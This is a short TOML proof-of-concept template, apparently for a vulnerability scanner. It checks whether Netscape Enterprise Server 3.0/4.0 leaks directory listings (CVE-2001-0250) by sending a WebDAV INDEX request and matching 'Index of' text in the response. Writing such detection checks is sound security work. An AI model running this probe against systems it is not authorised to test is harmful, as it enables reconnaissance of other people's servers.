[info]
author = "ave"
description = "验证 Netscape Enterprise Server 3.0/4.0 Web Publishing 功能是否存在 INDEX 命令目录信息泄露漏洞。攻击者通过发送 WebDAV INDEX 请求可列出 Web 根目录下的任意目录内容。"
id = "POC-AVE-2001-0098"
name = "CVE-2001-0250 PoC"
severity = "medium"
tags = ["ave-2001-0098"]
vuln_id = [
    "CVE-2001-0250",
    "AVE-2001-0098",
]

[poc]
logic = "any"

[[poc.requests]]
method = "INDEX"
path = "/{{BaseURL}}/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Parent Directory",
    "<title>Index of",
]
